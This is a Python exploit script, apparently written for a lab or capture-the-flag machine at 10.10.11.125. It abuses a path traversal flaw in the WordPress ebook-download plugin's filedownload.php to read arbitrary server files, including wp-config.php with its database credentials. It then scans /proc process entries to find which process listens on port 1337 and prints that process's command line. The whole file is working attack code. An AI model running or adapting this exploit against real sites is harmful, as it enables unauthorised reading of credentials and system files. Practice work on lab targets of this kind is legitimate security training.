import requests as rq
import readline

# ?ebookdownloadurl='../../../wp-config.php
url = 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php'


def readfile(path):
    res = rq.get(url, params={'ebookdownloadurl': path})
    print(res.text)
    return res


def parse_port(text):
    ports = []
    lines = text.strip().split('\n')
    for line in lines[1:-1]:
        cols = line.split(':')
        port = int(cols[2][:4], 16)
        # print(cols[2][:4], port)
        ports.append(port)
    return ports


proc = []
while True:
    path = input('path> ')
    if path == '':
        for i in range(1, 9999):
            print(f'[*] Port: {i}')
            res = readfile(f'../../../../../../../proc/{i}/net/tcp')
            ports = parse_port(res.text)
            if 1337 in ports:
                path = f'../../../../../../../proc/{i}/cmdline'
                res = readfile(path)
                if len(res.text) != (3*len(path) + len('<script>window.close()</script>')):
                    print(i)
                    text = res.text[3*len(path):-
                                    len('<script>window.close()</script>')]
                    print(text)
                    print(res.text)
                    proc.append(i)
        break
    readfile(path)

print(proc)
